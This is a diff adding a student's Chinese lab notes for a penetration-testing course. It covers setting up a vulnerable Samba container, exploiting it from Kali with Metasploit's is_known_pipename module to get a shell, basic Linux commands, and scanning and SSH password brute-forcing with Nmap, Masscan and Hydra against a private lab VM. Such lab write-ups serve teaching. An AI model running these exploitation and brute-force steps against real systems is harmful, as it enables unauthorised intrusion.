@@ -1,0 +1,150 @@
+# 第四章实验
+
+## 实验一
+
+1. 环境安装
+
+   - 首先先装好Centos虚拟机，作为靶机
+   - 装好Kail攻击机，作为攻击机
+   - 进入靶机查看环境
+     - **docker -v** 查看docker环境
+     - **docker-composer -v** 查看docker-compose的环境
+
+2. **cd /etc/docker**  进入指定文件夹，创建镜像源地址配置
+
+   - **vi daemon.json**
+
+   - ```
+     {
+     "registry-mirrors": [
+             "https://dockerpull.com",
+             "https://docker.anyhub.us.kg",
+             "https://dockerhub.jobcher.com",
+             "https://dockerhub.icu",
+             "https://docker.awsl9527.cn"
+         ]
+     }
+     ```
+
+   - 要确保国内的镜像源是有效的，我们可以复制到网站上看每天更新的镜像源
+
+   - 输入**systemctl daemon-reload**重新载入镜像源
+
+   - 输入**systemctl restart docker**重新启动docker
+
+   - 输入**docker info**查看镜像源地址是否正确更新了
+
+3. 来到/home/lh目录下，这个目录你先创建一个用户目录就会产生，我这边是lh命名的目录
+
+   - 我们进入到这个目录，ls查看当前文件，确保这个漏洞文件已经上传
+   - 进入到目录  pwd 保存当前路径
+   - 修改配置文件 vi smb.conf 将路径写入还有版本修改
+
+4. 把lh这用户加入docker组
+
+   -  gpasswd -a username docker
+   - newgrp docker  
+
+5. 切换用户 启动docker部署环境，如果拉取不成功的话，可能是网络或者镜像失效的问题，我这边已经部署好了，直接启动就行
+
+6. 验证启动是不是成功了
+
+   - docker ps -a | grep samba   看到服务已经起来了
+
+7. 切换到攻击机上面
+
+   - msfconsole
+   - use exploit/linux/samba/is_known_pipename
+   - set rhosts 192.168.204.128
+   - set SMB::AlwaysEncrypt false
+   - set SMB::ProtocolVersion 1
+   - run
+   - id
+
+8. 破解成功
+
+
+
+## 实验二
+
+1、切换目录
+
+​	pwd：查看当前路径
+
+​	cd.. 返回上级目录
+
+​	cd /etc   进入指定目录
+
+2、添加用户
+
+​	su -lh 切换到root权限
+
+​	adduser georia
+
+​	使用adduser命令添加georgia用户。在给添加用户的过程中，系统添加了一个同名的用户组，把新建的用户添加到了这个用户组里，并且为这个用户创建了一个主目录。此外，系统还提示补充这个用户的其他信息，如设置用户密码和填写用户全名等。
+
+​	adduser john 只有权限的用户才可以添加用户  这里我们使用的root权限，不然会报错
+
+3、切换用户 sudo adduser john 
+
+4、创建文件和目录
+
+​	touch myfile：创建一个文件
+
+​	mkdir mydirectory:创建一个文件夹
+
+5、复制文件
+
+​	cp /root/myfile  /root/mydirectory/myfile2 ：发现已经复制过来并改名为myfile2
+
+​	把某个文件移动到另一个位置的命令是mv。它的作用和cp命令基本相同，只是相当于在复制之后删除原文件。
+
+​	删除文件的命令是“rm文件名”。删除目录的命令是“rm -r”。
+
+6、文件权限ls -l myfile  可以看到这个文件的全部权限
+
+7、编辑文件  vi myfile
+
+8、查看进程
+
+ps -a 查看所有相关进程
+
+ps - Aux 查看有进程数据 
+
+
+
+## 实验三
+
+1、Nmap扫描工具
+
+Nmap是**主动扫描**工具，用于对**指定的**主机进行扫描
+
+
+nmap不加任何选项时，会扫描目标主机的在线状态、以及端口扫描。
+
+-sn选项(主机在线检查)
+
+使用-sn选项：可以只检测目标主机是否在线
+
+2、Masscan扫描工具
+
+Masscan是一款高速端口扫描工具，具备出色的扫描效率和大规模扫描的能力，支持TCP和UDP协议的扫描，并能够根据用户的需求指定多个目标和端口。
+
+扫描扫描192.168.204.128/32子网，扫描端口80和8000-8100范围的端口段）
+
+masscan -p80,8080-8100 192.168.204.128/32
+
+3、Hydra九头蛇弱口令爆破工具
+
+Hydra 是一款支持暴力破解的工具，它可以用于测试弱密码、验证口令策略等场景。以下是具体的使用方法和命令示例：
+
+我们这里先使用简单的做测试
+
+首先是用户名字典，cat user.txt
+
+然后是密码字典，cat pass.txt
+
+使用操作肯定是用比较复杂的，我们这里演示就用简单点的
+
+hydra -L user.txt -P password.txt 192.168.204.128 ssh
+
